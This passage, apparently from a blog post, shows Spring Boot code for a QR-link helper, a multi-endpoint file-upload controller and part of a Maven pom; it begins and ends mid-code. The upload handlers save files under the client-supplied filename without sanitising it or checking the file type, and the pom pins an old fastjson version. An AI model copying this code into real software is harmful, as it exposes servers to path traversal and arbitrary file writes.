</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String URL = <span class="string">"http://qr.liantu.com/api.php?text="</span> ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 二维码图片链接</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> id</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">GenerateQR</span><span class="params">(String id)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        String OR_Code_Url = URL + id ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> OR_Code_Url ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="服务使用"><a href="#服务使用" class="headerlink" title="服务使用"></a>服务使用</h2><h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.obox.obox.controller.file;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.Utils.IdUtil;</span><br><span class="line"><span class="keyword">import</span> com.obox.obox.model.token.NoToken;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.multipart.MultipartFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletInputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.swing.filechooser.FileView;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.StandardCopyOption;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/file"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UploadFileController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String ip = <span class="string">"http://118.31.120.92/wechat/"</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String spath = <span class="string">"/root/local/user/obox/pic/"</span> ;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用户头像上传</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> file</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"uploadusericon"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">UserIconUpload</span><span class="params">(@RequestParam(value = <span class="string">"file"</span>,required = <span class="keyword">true</span>)</span> MultipartFile file) </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String cata = <span class="string">"user/usericon/"</span> + IdUtil.Uid() + <span class="string">"/"</span> ;</span><br><span class="line">        String docname =  file.getOriginalFilename() ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Objects.isNull(file) || file.isEmpty()) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"文件为空，请重新上传"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = file.getBytes();</span><br><span class="line">            Path path = Paths.get(spath + cata + docname);</span><br><span class="line">            <span class="comment">//如果没有files文件夹，则创建</span></span><br><span class="line">            <span class="keyword">if</span> (!Files.isWritable(path)) &#123;</span><br><span class="line">                Files.createDirectories(Paths.get(spath+cata));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//文件写入指定路径</span></span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Object&gt; url = <span class="keyword">new</span> HashMap&lt;&gt;() ;</span><br><span class="line">        url.put(<span class="string">"url"</span>,ip+cata+docname) ;</span><br><span class="line">        <span class="keyword">return</span> url ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 商品信息上传</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> file</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"uploadgoodspic"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">GoodspicUpload</span><span class="params">(@RequestParam(value = <span class="string">"file"</span>,required = <span class="keyword">true</span>)</span> MultipartFile file) </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String cata = <span class="string">"business/goods/"</span> + IdUtil.Gid() + <span class="string">"/"</span>;</span><br><span class="line">        String docname = file.getOriginalFilename() ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Objects.isNull(file) || file.isEmpty()) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"文件为空，请重新上传"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = file.getBytes();</span><br><span class="line">            Path path = Paths.get(spath + cata + docname);</span><br><span class="line">            <span class="comment">//如果没有files文件夹，则创建</span></span><br><span class="line">            <span class="keyword">if</span> (!Files.isWritable(path)) &#123;</span><br><span class="line">                Files.createDirectories(Paths.get(spath+cata));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//文件写入指定路径</span></span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Object&gt; url = <span class="keyword">new</span> HashMap&lt;&gt;() ;</span><br><span class="line">        url.put(<span class="string">"url"</span>,ip+cata+docname) ;</span><br><span class="line">        <span class="keyword">return</span> url ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 商品图标上传</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> file</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"uploadgoodsicon"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">GoodsIconUpload</span><span class="params">(@RequestParam(value = <span class="string">"file"</span>,required = <span class="keyword">true</span>)</span> MultipartFile file) </span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        String cata = <span class="string">"business/goods/"</span> + IdUtil.Gid() + <span class="string">"/"</span>;</span><br><span class="line">        String docname = file.getOriginalFilename() ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Objects.isNull(file) || file.isEmpty()) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"文件为空，请重新上传"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = file.getBytes();</span><br><span class="line">            Path path = Paths.get(spath + cata + docname);</span><br><span class="line">            <span class="comment">//如果没有files文件夹，则创建</span></span><br><span class="line">            <span class="keyword">if</span> (!Files.isWritable(path)) &#123;</span><br><span class="line">                Files.createDirectories(Paths.get(spath+cata));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//文件写入指定路径</span></span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Object&gt; url = <span class="keyword">new</span> HashMap&lt;&gt;() ;</span><br><span class="line">        url.put(<span class="string">"url"</span>,ip+cata+docname) ;</span><br><span class="line">        <span class="keyword">return</span> url ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 商家背景上传</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> file</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"uploadbusinesspic"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">BusinessPicUpload</span><span class="params">(@RequestParam(value = <span class="string">"file"</span>,required = <span class="keyword">true</span>)</span> MultipartFile file)</span>&#123;</span><br><span class="line"></span><br><span class="line">        String cata = <span class="string">"business/businessman/"</span> + IdUtil.Bid() + <span class="string">"/"</span>;</span><br><span class="line">        String docname = file.getOriginalFilename() ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Objects.isNull(file) || file.isEmpty()) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"文件为空，请重新上传"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = file.getBytes();</span><br><span class="line">            Path path = Paths.get(spath + cata + docname);</span><br><span class="line">            <span class="comment">//如果没有files文件夹，则创建</span></span><br><span class="line">            <span class="keyword">if</span> (!Files.isWritable(path)) &#123;</span><br><span class="line">                Files.createDirectories(Paths.get(spath+cata));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//文件写入指定路径</span></span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Object&gt; url = <span class="keyword">new</span> HashMap&lt;&gt;() ;</span><br><span class="line">        url.put(<span class="string">"url"</span>,ip+cata+docname) ;</span><br><span class="line">        <span class="keyword">return</span> url ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 商家logo上传</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> file</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping</span>(<span class="string">"uploadbusinesslogo"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">BusinessLogoUpload</span><span class="params">(@RequestParam(value = <span class="string">"file"</span>,required = <span class="keyword">true</span>)</span> MultipartFile file)</span>&#123;</span><br><span class="line"></span><br><span class="line">        String cata = <span class="string">"business/businessman/"</span> + IdUtil.Bid() + <span class="string">"/"</span>;</span><br><span class="line">        String docname = file.getOriginalFilename() ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (Objects.isNull(file) || file.isEmpty()) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">"文件为空，请重新上传"</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = file.getBytes();</span><br><span class="line">            Path path = Paths.get(spath + cata + docname);</span><br><span class="line">            <span class="comment">//如果没有files文件夹，则创建</span></span><br><span class="line">            <span class="keyword">if</span> (!Files.isWritable(path)) &#123;</span><br><span class="line">                Files.createDirectories(Paths.get(spath+cata));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//文件写入指定路径</span></span><br><span class="line">            Files.write(path, bytes);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map&lt;String, Object&gt; url = <span class="keyword">new</span> HashMap&lt;&gt;() ;</span><br><span class="line">        url.put(<span class="string">"url"</span>,ip+cata+docname) ;</span><br><span class="line">        <span class="keyword">return</span> url ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="地表最强pom-gt-专治疑难杂症"><a href="#地表最强pom-gt-专治疑难杂症" class="headerlink" title="地表最强pom =&gt; 专治疑难杂症"></a>地表最强pom =&gt; 专治疑难杂症</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.6.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.obox<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>obox<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>obox<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>Demo project for Spring Boot<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;dependency&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;groupId&gt;org.springframework.security&lt;/groupId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;artifactId&gt;spring-security-test&lt;/artifactId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;scope&gt;test&lt;/scope&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;/dependency&gt;--&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.33<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span 